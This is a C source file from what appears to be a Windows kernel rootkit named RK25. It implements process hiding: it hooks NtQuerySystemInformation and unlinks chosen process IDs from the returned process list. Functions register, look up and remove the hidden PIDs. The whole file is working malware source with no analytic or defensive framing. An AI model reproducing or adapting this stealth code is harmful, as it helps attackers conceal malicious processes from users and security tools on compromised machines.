#pragma once

#include "rk25_hide_proc.h"

#define RK25_PROLOG_HIDE_PROC "Hide Proc"

PRK25_LC glLCProcess;
KSPIN_LOCK glHookLock;

VOID RK25HideProcessRoutine(
	IN				SYSTEM_INFORMATION_CLASS SystemInformationClass,
	IN	OUT			PVOID                    SystemInformation,
	IN				ULONG                    SystemInformationLength,
	OUT OPTIONAL	PULONG                   ReturnLength) {
	if (SystemInformationClass == SystemProcessInformation) {
		UCHAR hided = FALSE;
		KIRQL oldIrql;
		PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		PSYSTEM_PROCESS_INFORMATION prev = NULL;
		KeAcquireSpinLock(&glHookLock, &oldIrql); // lock
		while (TRUE) {
			if (RK25HideProcessGetByPID(proc->UniqueProcessId)) {
				RK25_DBG_INFO_F(RK25_PROLOG_HIDE_PROC, "Process pid:%d is hided", (ULONG_PTR)proc->UniqueProcessId);
				if (prev) {
					// default
					if (proc->NextEntryOffset) {
						prev->NextEntryOffset += proc->NextEntryOffset;
						hided = TRUE;
					}
					// if last proc
					else prev->NextEntryOffset = 0;
				}
				else {
					if (proc->NextEntryOffset) {
						// if first proc
						memmove(proc, (PBYTE)proc + proc->NextEntryOffset, SystemInformationLength - proc->NextEntryOffset);
						prev = NULL;
						proc = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
						continue;
					}
					else {
						// if empty
						SystemInformation = NULL;
						*ReturnLength = 0;
					}
				}
			}

			if (proc->NextEntryOffset) {
				if (hided) hided = FALSE;
				else prev = proc;
				proc = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)proc + proc->NextEntryOffset);
			}
			else break;
		}
		KeReleaseSpinLock(&glHookLock, oldIrql); // unlock
	}
}

VOID RK25HideProcessInit() { KeInitializeSpinLock(&glHookLock); glLCProcess = RK25ListInit(sizeof(RK25_PD)); }
VOID RK25HideProcessFree() { RK25ListFree(glLCProcess); }
VOID RK25HideProcessAdd(PRK25_PD task) { if (task) RK25ListAdd(glLCProcess, task); }
VOID RK25HideProcessAddByPID(IN CONST HANDLE pid) {	RK25HideProcessAdd(&(RK25_PD) { RK25_PROC_PID , pid }); }
NTSTATUS RK25HideProcessHook(ULONG attr) { return RK25HookNtQuerySystemInformation(attr, RK25HideProcessRoutine); }

PRK25_PD RK25HideProcessGet(IN CONST PVOID target, UCHAR attr) { 
	PRK25_PD entry;
	do {
		entry = (PRK25_PD)RK25ListEntryNext(glLCProcess);
		if (entry) {
			if (attr & RK25_PROC_PID) {
				if (entry->pid == (HANDLE)target) break;
			}
		}
	} while (entry != NULL);
	RK25ListFlush(glLCProcess);
	return entry;
}

PRK25_PD RK25HideProcessGetByPID(IN CONST HANDLE pid) {
	return RK25HideProcessGet((PVOID)pid, RK25_PROC_PID);
}

VOID RK25HideProcessDel(IN CONST HANDLE pid) {
	RK25ListEntryDel(glLCProcess, RK25HideProcessGetByPID(pid));
	RK25ListFlush(glLCProcess);
}
